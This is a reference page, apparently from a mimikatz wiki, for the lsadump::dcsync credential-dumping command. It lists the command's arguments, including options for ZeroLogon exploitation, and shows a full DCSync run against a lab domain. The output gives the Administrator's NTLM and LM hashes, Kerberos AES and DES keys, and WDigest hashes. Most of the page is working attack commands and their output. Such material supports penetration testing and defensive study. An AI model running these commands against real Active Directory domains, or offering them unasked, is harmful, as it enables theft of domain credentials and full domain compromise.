# dcsync

`lsadump::dcsync` can be used to do a [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) and retrieve domain secrets. This command uses the Directory Replication Service Remote protocol ([MS-DRSR](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47?redirectedfrom=MSDN)) to request from a domain controller to synchronize a specified entry. It's the same protocol that domain controllers are using between them. It has the following command line arguments:

* `/all` : It will DCSync the entire active directory database
* `/user`: perform syncing only for the specified user
* `/export` : Save the output
* `/csv` : export to csv
* `/dc` or `/kdc`: Specify the Domain Controller to connect to and gather data
* `/guid` : The GUID of the object to sync credentials. It can be obtained with [net::trust](../net/trust.md)

The following command line arguments of `lsadump::dcsync` can be used for [ZeroLogon](https://www.thehacker.recipes/ad/movement/netlogon/zerologon) exploitation:

* `/authuser`: the domain controller's machine account
* `/authdomain`: the NetBIOS of the domain
* `/authpassword`: it has to be set to blank `""`
* `/authntlm`: user NTLM authentication

```
mimikatz # lsadump::dcsync /domain:hacklab.local /user:hacklab\Administrator
[DC] 'hacklab.local' will be the domain
[DC] 'DC.hacklab.local' will be the DC server
[DC] 'hacklab\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 01/01/1601 01:00:00
Password last change : 24/09/2021 16:24:41
Object Security ID   : S-1-5-21-2725560159-1428537199-2260736313-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: b09a14d2d325026f8986d4a874fbcbc7
    ntlm- 0: b09a14d2d325026f8986d4a874fbcbc7
    ntlm- 1: a06b19f88e0432e937a67fb6848e56bd
    lm  - 0: b28dd7b27e8cf0d2293087d70fc35769

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a367950918bb2ccabb50ab88e8ffb09f

* Primary:Kerberos-Newer-Keys *
    Default Salt : HACKLAB.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 0c1230dca827b75e872b5e5601eb6b76016412b4dd96b4aeb99a59a43490182c
      aes128_hmac       (4096) : e52cb5008be21bfe2e8429c74659d925
      des_cbc_md5       (4096) : 4f45e3a7cd34bc83

* Primary:Kerberos *
    Default Salt : HACKLAB.LOCALAdministrator
    Credentials
      des_cbc_md5       : 4f45e3a7cd34bc83

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  6ca5712f90260e1eb3abd67598e6750a
    02  8dffe5b3aefb6e5ae29e628d2ee96a45
    03  17be46dc199faf9b0bbda5bad36e3d6e
    04  6ca5712f90260e1eb3abd67598e6750a
    05  6fc635e3af189352029ce83a2219fa3c
    06  510782016677b838b585d4f04d23f98a
    07  b358628b75f049cf9e78f5e49bc560a2
    08  c40c4076a86fbf852da4cb4bfa721d74
    09  bf6734b4833bd61834c48fa6533acb9a
    10  3c148f6edbc99e9a489d72fb809ee66b
    11  0a100f8d2212e336adf8c429722d3a8c
    12  c40c4076a86fbf852da4cb4bfa721d74
    13  e649568c12076eba2026544142dc74fd
    14  3ef797336ba53aaf034774a4fe8b06dc
    15  797740715ee8fa059260c583fef36d5e
    16  84aa405aaf242960160143fa357a3c7f
    17  bb9ea6391483fa61fba5dced60ea039c
    18  3871d21dfa14ede3c56b04ffc5970b1c
    19  8e7946ea6e13210cb3ded49e2ff501fa
    20  7480b0f8878e31ee2dcf3507fc2dbf54
    21  2f7b7c9a2ac171f4417a38a52ef89989
    22  3483e4a4ca60cd4b3d0bc66dc900f175
    23  e1fa4a98cdab50c99934120090885d90
    24  e16cb6277ed064c290498037f5dfe5b3
    25  d6b096727b0d7a39cae06afd874247a9
    26  f7a5f95bb7f0d0be1d8fe247b875cb29
    27  e781f3584bf099e0a485657e832c6e74
    28  acb55c0b8828a6660b166fc649708c1c
    29  8fd36767c074ca738a81d5c7298295c3
```

{% hint style="warning" %}
When run `lsadump::dcsync` directly on the domain controller, it is not needed to specify the domain in the`/user`.

`mimikatz # lsadump::dcsync /user:Administrator /domain:hacklab.local`
{% endhint %}
